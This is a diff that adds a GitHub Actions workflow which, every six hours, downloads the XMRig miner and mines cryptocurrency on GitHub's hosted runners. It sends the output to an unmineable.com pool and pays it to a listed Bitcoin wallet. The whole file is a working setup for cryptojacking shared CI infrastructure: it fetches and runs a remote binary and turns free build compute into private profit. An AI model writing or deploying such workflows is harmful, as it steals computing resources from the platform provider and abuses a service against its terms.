@@ -1,0 +1,29 @@
+name: Unmineable BTC Miner 5
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "0 */6 * * *"  # Otomatis tiap 6 jam
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Install dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+
+      - name: Download XMRig
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.24.0-linux-static-x64.tar.gz
+
+      - name: Run miner
+        run: |
+          cd xmrig-6.24.0
+          chmod +x xmrig
+          ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 \
+            -u BTC:bc1ql83n6aql33keyqygsggq5zaczuefmlyrpv9h49.unmineable_miner_ghaction5#xg8f-8asc \
+            -p x -k --no-color
